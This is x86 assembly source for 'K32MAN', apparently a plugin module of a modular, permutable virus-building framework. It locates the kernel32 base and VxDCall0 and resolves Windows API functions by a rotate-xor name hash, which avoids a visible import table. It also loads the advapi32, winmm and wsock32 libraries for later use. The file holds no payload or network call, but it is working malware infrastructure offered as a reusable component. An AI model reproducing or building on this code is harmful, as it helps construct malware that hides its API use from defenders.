   ; K32MAN
   ; ~~~~~~
   ; - ring3 kernel-api manager

   ; winNT/2000: k32man_get_kernel_base() should be modified

   include                 INCLUDE\consts.inc
   include                 INCLUDE\pe.inc
   include                 INCLUDE\mz.inc
   include                 INCLUDE\s2c.inc

   include                 plugin.inc
                           PLUGIN_START    K32MAN, W32R3, PERMUTABLE

   handleevent:            hookevent EV_K32MAN_GET_PROC_ADDRESS,    k32man_get_proc_address
                           hookevent EV_K32MAN_GET_PROC_ADDRESS_EX, k32man_get_proc_address_ex
                           hookevent EV_K32MAN_GET_KERNEL_BASE,     k32man_get_kernel_base
                           hookevent EV_K32MAN_GET_VXDCALL0,        k32man_get_vxdcall0
                           hookevent EV_K32MAN_GET_ADVAPI32DLL_BASE,k32man_get_advapi32dll_base
                           hookevent EV_K32MAN_GET_WINMMDLL_BASE,   k32man_get_winmmdll_base
                           hookevent EV_K32MAN_GET_WSOCK32DLL_BASE, k32man_get_wsock32dll_base
                           stc
                           retn

   ; output: EBX=kernel base
   ;         EAX=@vxdcall0

   k32man_get_vxdcall0:    call    k32man_get_kernel_base
                           mov     eax, [ebx].mz_neptr
                           mov     eax, [ebx+eax].pe_exporttablerva
                           mov     eax, [ebx+eax].ex_addresstablerva
                           mov     eax, [ebx+eax]
                           add     eax, ebx
                           clc
                           retn

   k32man_get_kernel_base: call    get_kernel_base
                           clc
                           retn

   ; input:  EBX=dll base
   ; output: EBX=dll base va, ECX=kernel_export va

   get_export_base:        mov     ecx, [ebx].mz_neptr     ; ECX=export va
                           mov     ecx, [ecx+ebx].pe_exporttablerva
                           jecxz   __exit
                           add     ecx, ebx
   __exit:                 retn

   ; input:  EBX=dll imagebase va
   ;         ...
   k32man_get_proc_address_ex:
                           pusha
                           jmp     k32man_x1

   ; input:  EDI=name csum
   ; output: ZF=1, EAX=0 (function not found)
   ;         ZF=0, EAX=function va

   k32man_get_proc_address:pusha
                           call    get_kernel_base

   k32man_x1:              call    get_export_base
                           jecxz   __return_0

                           xor     esi, esi        ; current index
   __search_cycle:         lea     edx, [esi*4+ebx]
                           add     edx, [ecx].ex_namepointersrva
                           mov     edx, [edx]      ; name va
                           add     edx, ebx        ; +imagebase

                           xor     eax, eax        ; calculate hash
   __calc_hash:            rol     eax, 7
                           xor     al, [edx]
                           inc     edx
                           cmp     byte ptr [edx], 0
                           jne     __calc_hash

                           cmp     eax, edi        ; compare hashs
                           je      __name_found

                           inc     esi             ; index++
                           cmp     esi, [ecx].ex_numofnamepointers
                           jb      __search_cycle

   __return_0:             xor     eax, eax        ; return 0
                           jmp     __return

   __name_found:           mov     edx, [ecx].ex_ordinaltablerva
                           add     edx, ebx        ; +imagebase
                           movzx   edx, word ptr [edx+esi*2]; edx=current ordinal
   ;                       sub     edx, [ecx].ex_ordinalbase  ; -ordinal base
                           mov     eax, [ecx].ex_addresstablerva
                           add     eax, ebx        ; +imagebase
                           mov     eax, [eax+edx*4]; eax=current address
                           add     eax, ebx        ; +imagebase

   __return:               mov     [esp].popa_eax, eax  ; popa.eax

                           popa
                           clc
                           retn

   include                 k32man1.inc

   k32man_get_advapi32dll_base:
                           pusha
                           x_push  eax, ADVAPI32.DLL~
                           push    esp
                           callX   LoadLibraryA
                           x_pop
                           mov     [esp].popa_ebx, eax
                           popa
                           clc
                           retn

   k32man_get_winmmdll_base:
                           pusha
                           x_push  eax, WINMM.DLL~
                           push    esp
                           callX   LoadLibraryA
                           x_pop
                           mov     [esp].popa_ebx, eax
                           popa
                           clc
                           retn

   k32man_get_wsock32dll_base:
                           pusha
                           x_push  eax, WSOCK32.DLL~
                           push    esp
                           callX   LoadLibraryA
                           x_pop
                           mov     [esp].popa_ebx, eax
                           popa
                           clc
                           retn

                           PLUGIN_END
